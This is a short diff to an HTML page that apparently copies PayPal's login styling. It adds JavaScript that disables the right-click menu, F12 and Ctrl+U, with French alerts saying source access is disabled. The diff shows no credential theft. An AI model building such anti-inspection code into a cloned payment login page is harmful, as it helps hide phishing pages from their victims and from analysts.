@@ -9,7 +9,13 @@
     <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/6e6/b12951786fe675b692c5cf7e74529/css/contextualLoginElementalUIv4.css" />
     <style id="antiClickjack">body {display: none !important;}</style>
     
-    document.addEventListener('keydown', function(e) {
+<script>
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();  // Empêche le menu contextuel
+    alert("L'accès au code source est désactivé.");
+});
+
+document.addEventListener('keydown', function(e) {
     if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 85)) {
         e.preventDefault();  // Empêche l'ouverture des outils de développement
         alert("L'accès au code source est désactivé.");
